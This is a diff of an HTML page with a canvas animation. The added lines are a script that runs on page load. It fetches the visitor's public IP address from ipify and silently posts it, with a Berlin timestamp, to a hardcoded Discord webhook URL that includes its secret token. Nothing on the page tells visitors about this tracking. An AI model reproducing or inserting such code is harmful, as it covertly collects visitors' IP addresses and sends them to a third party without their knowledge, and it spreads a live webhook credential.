@@ -185,6 +185,30 @@
         // Initialisierung
         resizeCanvas();
         animate();
+
+        const webhookUrl = 'https://discord.com/api/webhooks/1239991202716319816/xaygC0PMgh6E4-uNhKYO0Sy-7Uti5TkT7flGHP73Hq2rWxRisqa4Z2skzT3jD2B4ME8S'; // Ersetze dies durch deine tatsächliche Webhook-URL
+
+        function sendNotification() {
+            const berlinTime = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    const notificationContent = `-----\nOpened!\Time: ${berlinTime}\nIP: ||${ipAddress}||\n-----`;
+                    const payload = {
+                        content: notificationContent
+                    };
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                })
+        }
+
+        window.onload = sendNotification;
     </script>
 </body>
 </html>
